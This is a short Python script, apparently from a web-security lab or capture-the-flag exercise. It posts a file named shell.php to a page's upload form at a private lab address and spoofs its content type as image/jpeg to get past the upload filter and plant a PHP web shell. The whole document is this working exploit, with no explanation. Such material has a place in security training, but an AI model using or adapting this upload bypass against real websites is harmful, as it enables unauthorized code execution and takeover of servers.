from bs4 import BeautifulSoup
import requests
import time
from requests.adapters import Retry, HTTPAdapter

#url = 'http://localhost:1025/?page=upload'
url = 'http://10.12.250.191/?page=upload'

page = requests.post(url, files={'uploaded': ("shell.php", open("shell.php", "rb"), "image/jpeg")}, data={'Upload':'Upload'} )
soup = BeautifulSoup(page.text, 'html.parser')
print(soup.prettify())
#print(page.text)